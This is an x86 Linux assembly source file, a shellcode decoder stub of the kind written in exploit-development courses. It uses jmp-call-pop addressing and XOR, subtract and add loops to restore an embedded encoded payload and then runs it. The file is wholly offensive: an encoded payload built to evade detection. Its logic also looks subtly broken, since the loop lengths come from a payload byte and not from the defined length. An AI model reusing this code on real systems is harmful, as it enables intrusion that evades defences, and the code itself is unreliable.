;decode.nasm
;this decodes shellcode encoded by encode.rb
;Linux x86
;Sanjiv Kawa (@skawasec)
;www.popped.io
;Decemeber 2, 2016

global _start

section .text
_start:
  jmp short encoded_shellcode

decode:
  pop esi             ;the address for EncodedShellcode is placed in to ESI
  push esi            ;the address for EncodedShellcode is pushed on to the stack for preservation
  lea edi, [esi +10]  ;the address for EncodedShellcode with an offset of 10 is placed into EDI

  xor ecx, ecx      ;clearing out ecx
  mov cl, [esi +8]  ;the length of the EncodedShellcode is placed into DL

xor_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
  xor bl, 0xd3          ;xor'ing the current value in BL with 0xd3 and placing that value into BL
  mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
  inc esi               ;shifting to the next byte
  loop xor_decoder_loop ;looping through the entirety of EncodedShellcode

  pop esi       ;resetting esi to its original location, the beginning of EncodedShellcode
  xor ecx, ecx  ;clearing out ecx
  mov cl, 10    ;this sets the loop count for sub_decoder_loop. The fixed value of 10 is okay as only the first 10 bytes need to be subtracted.

  xor edx, edx      ;clearing out edx
  mov dl, [esi +8]  ;the length of the EncodedShellcode is placed into DL

  xor eax, eax  ;clearing out eax
  mov al, 5     ;5 is the subtraction value

sub_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
  sub bl, al            ;subtracting the current value in BL by 5 and placing that value into BL
  mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
  inc esi               ;shifting to the next byte
  loop sub_decoder_loop ;loop 10 times

  xor ecx, ecx  ;clearing out ecx
  mov cl, dl    ;moving the length of EncodedShellcode into CL
  sub cl, 10    ;subtracting the length of EncodedShellcode in CL by 10 as we have already decoded 10 bytes
  add al, 2     ;adding 2 to AL. 7 is the addition value.

add_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [edi]    ;taking the current byte in EncodedShellcode and placing it into BL. EDI starts at +10.
  add bl, al            ;adding the current value in BL by 7 and placing that value into BL
  mov byte [edi], bl    ;replacing the current byte at the memory location pointed to by EDI with the decoded byte
  inc edi               ;shifting to the next byte
  loop add_decoder_loop ;loop until CL has been met

  jmp short EncodedShellcode ;pass execution to the decoded shellcode

encoded_shellcode:
  call decode
  EncodedShellcode: db 0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa
  EncodedShellcodeLen equ $-EncodedShellcode
